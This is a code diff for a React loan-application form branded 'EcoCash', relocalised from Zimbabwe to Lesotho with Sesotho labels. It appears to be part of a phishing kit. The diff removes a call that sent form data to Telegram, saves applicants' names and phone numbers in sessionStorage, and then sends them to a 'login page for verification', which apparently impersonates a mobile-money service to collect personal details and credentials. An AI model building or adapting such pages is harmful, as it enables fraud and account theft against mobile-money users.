@@ -1,5 +1,4 @@
 import { useState, FormEvent } from 'react'
-import { sendToTelegram } from '../utils/telegram'
 
 interface FormData {
   name: string
@@ -27,16 +26,18 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
     setLoading(true)
     setMessage(null)
 
-    try {
-      await sendToTelegram(formData)
-      // Redirect to success page after submission
-      setTimeout(() => {
+    // Simulate form validation
+    setTimeout(() => {
+      if (formData.name && formData.phone && formData.amount && formData.duration) {
+        // Store form data in sessionStorage for later submission
+        sessionStorage.setItem('loanFormData', JSON.stringify(formData))
+        // Move to login page for verification
         onSubmitSuccess()
-      }, 1000)
-    } catch (error) {
-      setMessage({ type: 'error', text: 'Failed to submit application. Please try again.' })
-      setLoading(false)
-    }
+      } else {
+        setMessage({ type: 'error', text: 'Please fill all fields / Kenya lintlha tsohle' })
+        setLoading(false)
+      }
+    }, 500)
   }
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
@@ -55,11 +56,12 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
             <span className="text-white">Eco</span>
             <span className="text-red-600">Cash</span>
           </h1>
-          <p className="text-white text-xl font-medium tracking-wide">Spache - Fono</p>
+          <p className="text-white text-xl font-medium tracking-wide">Kadimo - Lesotho</p>
           <div className="mt-4 flex items-center justify-center gap-2 text-white">
             <i className="fas fa-money-bill-wave"></i>
-            <span className="text-lg">Quick Loan Application</span>
+            <span className="text-lg">Kopo ea Kadimo ea Potlako</span>
           </div>
+          <p className="text-white/80 text-sm mt-2">Quick Loan Application</p>
         </div>
 
         {/* Form Card */}
@@ -69,7 +71,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
             <div>
               <label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-2">
                 <i className="fas fa-user mr-2 text-purple-600"></i>
-                Full Name
+                Lebitso la Hau (Your Full Name)
               </label>
               <input
                 type="text"
@@ -79,7 +81,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
                 value={formData.name}
                 onChange={handleChange}
                 className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
-                placeholder="Enter your full name"
+                placeholder="Kenya lebitso la hau le felletseng"
               />
             </div>
 
@@ -87,7 +89,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
             <div>
               <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
                 <i className="fas fa-phone mr-2 text-purple-600"></i>
-                Phone Number
+                Nomoro ea Mohala (Phone Number)
               </label>
               <input
                 type="tel"
@@ -97,7 +99,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
                 value={formData.phone}
                 onChange={handleChange}
                 className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
-                placeholder="+263 XXX XXX XXX"
+                placeholder="+266 XXXX XXXX"
               />
             </div>
 
@@ -105,7 +107,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
             <div>
               <label htmlFor="amount" className="block text-sm font-medium text-gray-700 mb-2">
                 <i className="fas fa-dollar-sign mr-2 text-purple-600"></i>
-                Loan Amount
+                Chelete ea Kadimo (Loan Amount)
               </label>
               <input
                 type="number"
@@ -116,7 +118,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
                 value={formData.amount}
                 onChange={handleChange}
                 className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
-                placeholder="Enter amount in USD"
+                placeholder="Kenya chelete ka Maloti (LSL)"
               />
             </div>
 
@@ -124,7 +126,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
             <div>
               <label htmlFor="duration" className="block text-sm font-medium text-gray-700 mb-2">
                 <i className="fas fa-calendar-alt mr-2 text-purple-600"></i>
-                Loan Duration
+                Nako ea ho Lefa (Repayment Period)
               </label>
               <select
                 id="duration"
@@ -134,12 +136,12 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
                 onChange={handleChange}
                 className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
               >
-                <option value="">Select duration</option>
-                <option value="1">1 Month</option>
-                <option value="3">3 Months</option>
-                <option value="6">6 Months</option>
-                <option value="12">12 Months</option>
-                <option value="24">24 Months</option>
+                <option value="">Khetha nako (Select duration)</option>
+                <option value="1">Khoeli e 1 (1 Month)</option>
+                <option value="3">Likhoeli tse 3 (3 Months)</option>
+                <option value="6">Likhoeli tse 6 (6 Months)</option>
+                <option value="12">Selemo se 1 (12 Months)</option>
+                <option value="24">Lilemo tse 2 (24 Months)</option>
               </select>
             </div>
 
@@ -152,12 +154,12 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
               {loading ? (
                 <>
                   <i className="fas fa-spinner fa-spin"></i>
-                  <span>Submitting...</span>
+                  <span>E Romela... (Submitting)</span>
                 </>
               ) : (
                 <>
                   <i className="fas fa-paper-plane"></i>
-                  <span>Submit Application</span>
+                  <span>Romela Kopo (Submit Application)</span>
                 </>
               )}
             </button>
@@ -180,7 +182,7 @@ const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
         <div className="mt-6 text-center text-white text-sm">
           <p className="flex items-center justify-center gap-2">
             <i className="fas fa-shield-alt"></i>
-            <span>Secure and confidential</span>
+            <span>Sireletseha le Sephiri (Secure & Confidential)</span>
           </p>
         </div>
       </div>
